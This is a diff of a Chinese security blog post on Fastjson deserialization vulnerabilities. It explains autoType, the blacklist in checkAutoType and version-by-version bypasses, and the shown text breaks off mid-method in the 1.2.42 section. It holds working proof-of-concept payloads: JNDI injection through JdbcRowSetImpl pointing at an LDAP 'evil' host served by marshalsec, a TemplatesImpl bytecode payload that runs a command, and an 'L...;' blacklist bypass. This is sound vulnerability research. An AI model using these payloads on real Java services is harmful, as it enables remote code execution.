@@ -533,7 +533,7 @@
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '80a9bc22b0c73cc4577bb06accc750dc46b40920b36270874d18eb6e8fa75ccd';
+        let pwd = '';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误，将返回主页！');
@@ -702,14 +702,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        590
+                        2.6k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        2 分
+                        12 分
                     </div>
                     
                 
@@ -745,15 +745,418 @@
 <p>safeMode加固：</p>
 <p>fastjson在1.2.68及之后的版本中引入了safeMode，<a href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode" target="_blank" rel="noopener">配置safeMode</a>后，无论白名单和黑名单，都不支持autoType，可一定程度上缓解反序列化Gadgets类变种攻击（关闭autoType注意评估对业务的影响）</p>
 </blockquote>
+<pre class="line-numbers language-java"><code class="language-java">JSON#<span class="token function">parseObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    JSON#<span class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">new</span> <span class="token class-name">DefaultJSONParser</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> ParserConfig<span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> features<span class="token punctuation">)</span> # 记录field在还原对象的调用method
+        DefaultJSONParser#<span class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+            DefaultJSONParser#<span class="token function">parseObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                ParserConfig#<span class="token function">checkAutoType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> # 引入的黑名单白名单
+                    TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> #正常的逻辑进入这里进行类的加载Json的parser建立<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>从安全的公告中可以看出这两个关键的节点：</p>
 <ul>
-<li><p>autoType的利用</p>
+<li>autoType的利用</li>
+<li>autoType的绕过</li>
+</ul>
+<p>环境默认不说明是JDK1.8u181</p>
+<h2 id="一、Fastjson-lt-1-2-24"><a href="#一、Fastjson-lt-1-2-24" class="headerlink" title="一、Fastjson <= 1.2.24"></a>一、Fastjson &lt;= 1.2.24</h2><p>在这个版本之前，Fastjson默认支持autoType属性，即可以通过@Type指定Fastjon调用特定类的setter 或者getter方法，且黑名单中只有连个类，利用的方式有：</p>
+<blockquote>
+<p>1.JNDI 注入利用</p>
+<p>2.Java类加载或反序列利用</p>
+</blockquote>
+<p>通过marshalsec快速搭建LDAP服务器</p>
+<pre class="line-numbers language-shell"><code class="language-shell">java -cp target\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.58.131:8080/#ExecTest 1099<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>如通过JNDI注入利用</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
+<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">TestJdbcRowsetImple</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">final</span> String clazz <span class="token operator">=</span> <span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">;</span>
+    <span class="token keyword">final</span> String addr <span class="token operator">=</span> <span class="token string">"ldap://192.168.8.115:1099/evil"</span><span class="token punctuation">;</span>
+
+
+    String poc <span class="token operator">=</span> <span class="token string">"{\"@type\":\""</span> <span class="token operator">+</span>clazz <span class="token operator">+</span><span class="token string">"\","</span><span class="token operator">+</span>
+        <span class="token string">"\"dataSourceName\":\""</span> <span class="token operator">+</span> addr <span class="token operator">+</span> <span class="token string">"\","</span> <span class="token operator">+</span>
+        <span class="token string">"\"autoCommit\":true"</span> <span class="token operator">+</span>
+        <span class="token string">"}"</span><span class="token punctuation">;</span>
+    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    JSONObject<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228181931863.png" alt="image-20201228181931863"></p>
+<p>如通过java类加载利用</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">TestTemplateImple</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> CannotCompileException<span class="token punctuation">,</span> NotFoundException <span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">//POC1</span>
+    <span class="token comment" spellcheck="true">//将字节码输出，TemplateImpl loadClass 实现类的加载</span>
+    <span class="token comment" spellcheck="true">//FileInputStream fis = new FileInputStream("target/test-classes/com/thonsun/demo02/ExploitOne.class");</span>
+    <span class="token comment" spellcheck="true">//ByteArrayOutputStream barr = new ByteArrayOutputStream();</span>
+    <span class="token comment" spellcheck="true">//IOUtils.copy(fis, barr);</span>
+    <span class="token comment" spellcheck="true">//String base64Poc = Base64.encodeBase64String(barr.toByteArray());</span>
+    <span class="token comment" spellcheck="true">//</span>
+
+    <span class="token comment" spellcheck="true">//POC2</span>
+    String base64Poc <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">encodeBase64String</span><span class="token punctuation">(</span><span class="token function">getPocbyte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">final</span> String CLASS <span class="token operator">=</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">;</span>
+    String poc <span class="token operator">=</span> <span class="token string">"{\"@type\":"</span> <span class="token operator">+</span> <span class="token string">"\""</span> <span class="token operator">+</span> CLASS <span class="token operator">+</span> <span class="token string">"\","</span> <span class="token operator">+</span>
+        <span class="token string">"\"_bytecodes\":"</span> <span class="token operator">+</span> <span class="token string">"[\""</span> <span class="token operator">+</span> base64Poc <span class="token operator">+</span> <span class="token string">"\"],"</span> <span class="token operator">+</span>
+        <span class="token string">"\"_name\":\"thonsun\","</span> <span class="token operator">+</span>
+        <span class="token string">"\"_tfactory\":{},"</span> <span class="token operator">+</span>
+        <span class="token string">"\"_outputProperties\":{}}"</span><span class="token punctuation">;</span>
+    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    JSONObject<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>poc<span class="token punctuation">,</span> Feature<span class="token punctuation">.</span>SupportNonPublicField<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getPocbyte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> CannotCompileException<span class="token punctuation">,</span> NotFoundException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>
+    ClassPool pool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    CtClass cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>TestPoc<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">//java.lang.Runtime.getRuntime().exec("calc");</span>
+    String cmd <span class="token operator">=</span> <span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">;</span>
+
+
+    cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    String randomClassName <span class="token operator">=</span> <span class="token string">"Thonsun"</span> <span class="token operator">+</span> System<span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    cc<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>randomClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置父类</span>
+    <span class="token keyword">return</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>JDK1.8u181</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228175608633.png" alt="image-20201228175608633"></p>
+<h2 id="二、Fastjson-blacklist"><a href="#二、Fastjson-blacklist" class="headerlink" title="二、Fastjson blacklist"></a>二、Fastjson blacklist</h2><p>选择fastjson 1.2.47版本说明fastjson在1.2.24版本后引入的防御机制</p>
+<h3 id="2-1-Fastjson-1-2-25"><a href="#2-1-Fastjson-1-2-25" class="headerlink" title="2.1 Fastjson 1.2.25"></a>2.1 Fastjson 1.2.25</h3><p>在1.2.25开始，fastjson 设置autoType默认关闭，同时增加了黑名的机制。下面的一些绕过是基于显式开启autoType的绕过利用。</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">checkAutoType</span><span class="token punctuation">(</span>String typeName<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> expectClass<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">final</span> String className <span class="token operator">=</span> typeName<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">//先进行白名单匹配，如果匹配成功则直接返回。可见所谓的关闭白名单机制是不只限于白名单</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> acceptList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                String accept <span class="token operator">=</span> acceptList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>accept<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">return</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> defaultClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+           <span class="token comment" spellcheck="true">//同样进行黑名单匹配，如果匹配成功，则报错推出。</span>
+            <span class="token comment" spellcheck="true">//需要注意这百年所谓的匹配都是startsWith开头匹配</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> denyList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                String deny <span class="token operator">=</span> denyList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>deny<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token comment" spellcheck="true">//一些固定类型的判断，不会对clazz进行赋值，此处省略</span>
+
+        <span class="token comment" spellcheck="true">//不匹配白名单中也不匹配黑名单的，进入此处，进行class加载</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> defaultClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token comment" spellcheck="true">//对于加载的类进行危险性判断，判断加载的clazz是否继承自Classloader与DataSource</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>ClassLoader<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// classloader is danger</span>
+                    <span class="token operator">||</span> DataSource<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// dataSource can load jdbc driver</span>
+                    <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">//返回加载的class</span>
+        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>再次运行POC：</p>
+<p>在checkAutoType函数处可以看到fastjson的黑名单默认21个，白名单没有，这里的poc命中 com.sun.(startWith)结束Json解析</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228184614482.png" alt="image-20201228184614482"></p>
+<p>这里的两个绕过利用的思路</p>
+<blockquote>
+<p>1.寻找不在黑名的利用类</p>
+<p>2.寻找checkAutoType()逻辑漏洞绕过黑名单检查，如添加特殊字符。</p>
+</blockquote>
+<p>可以看到最终的TypeUtils.loadClass()辑</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228185805413.png" alt="image-20201228185805413"></p>
+<ul>
+<li><p>如果这个className是以<code>[</code>开头我们会去掉<code>[</code>进行加载！</p>
+<p>  但是实际上在代码中也可以看见它会返回Array的实例变成数组。在实际中它远远不会执行到这一步，在json串解析时就已经报错。</p>
 </li>
-<li><p>autoType的绕过</p>
+<li><p>如果这个className是以<code>L</code>开头<code>;</code>结尾，就会去掉开头和结尾进行加载！</p>
 </li>
 </ul>
-<h2 id="一、Fastjson-lt-1-2-24"><a href="#一、Fastjson-lt-1-2-24" class="headerlink" title="一、Fastjson <= 1.2.24"></a>一、Fastjson &lt;= 1.2.24</h2><h2 id="二、Fastjson-blacklist"><a href="#二、Fastjson-blacklist" class="headerlink" title="二、Fastjson blacklist"></a>二、Fastjson blacklist</h2><p>fastjson 1.2.47 缓存绕过</p>
-<h2 id="三、Fastjson-lt-1-2-68"><a href="#三、Fastjson-lt-1-2-68" class="headerlink" title="三、Fastjson <= 1.2.68"></a>三、Fastjson &lt;= 1.2.68</h2><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>1.<a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315" target="_blank" rel="noopener">fastjson 安全公告</a></p>
+<p>所以一个绕过的poc,这个poc在 Fastjson 1.2.25 -~ 1.2.41都可以使用</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
+<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">TestJdbcRowsetImple</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">final</span> String clazz <span class="token operator">=</span> <span class="token string">"Lcom.sun.rowset.JdbcRowSetImpl;"</span><span class="token punctuation">;</span>
+    <span class="token keyword">final</span> String addr <span class="token operator">=</span> <span class="token string">"ldap://192.168.8.115:1099/evil"</span><span class="token punctuation">;</span>
+
+
+    String poc <span class="token operator">=</span> <span class="token string">"{\"@type\":\""</span> <span class="token operator">+</span>clazz <span class="token operator">+</span><span class="token string">"\","</span><span class="token operator">+</span>
+        <span class="token string">"\"dataSourceName\":\""</span> <span class="token operator">+</span> addr <span class="token operator">+</span> <span class="token string">"\","</span> <span class="token operator">+</span>
+        <span class="token string">"\"autoCommit\":true"</span> <span class="token operator">+</span>
+        <span class="token string">"}"</span><span class="token punctuation">;</span>
+    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    ParserConfig<span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    JSONObject<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228193225941.png" alt="image-20201228193225941"></p>
+<h3 id="2-2-Fastjson-1-2-42"><a href="#2-2-Fastjson-1-2-42" class="headerlink" title="2.2 Fastjson 1.2.42"></a>2.2 Fastjson 1.2.42</h3><p>在Fastjson 12.42的版本中，对上面的绕过进行了修复</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">checkAutoType</span><span class="token punctuation">(</span>String typeName<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> expectClass<span class="token punctuation">,</span> <span class="token keyword">int</span> features<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">128</span> <span class="token operator">&amp;&amp;</span> typeName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            String className <span class="token operator">=</span> typeName<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz <span class="token operator">=</span> null<span class="token punctuation">;</span>
+            <span class="token keyword">long</span> BASIC <span class="token operator">=</span> <span class="token operator">-</span>3750763034362895579L<span class="token punctuation">;</span>
+            <span class="token keyword">long</span> PRIME <span class="token operator">=</span> 1099511628211L<span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>3750763034362895579L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">==</span> 655701488918567152L<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                className <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">long</span> h3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>3750763034362895579L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L<span class="token punctuation">;</span>
+            <span class="token keyword">long</span> hash<span class="token punctuation">;</span>
+            <span class="token keyword">int</span> i<span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                hash <span class="token operator">=</span> h3<span class="token punctuation">;</span>
+
+                <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    hash <span class="token operator">^=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    hash <span class="token operator">*=</span> 1099511628211L<span class="token punctuation">;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>acceptHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+                    <span class="token punctuation">}</span>
+
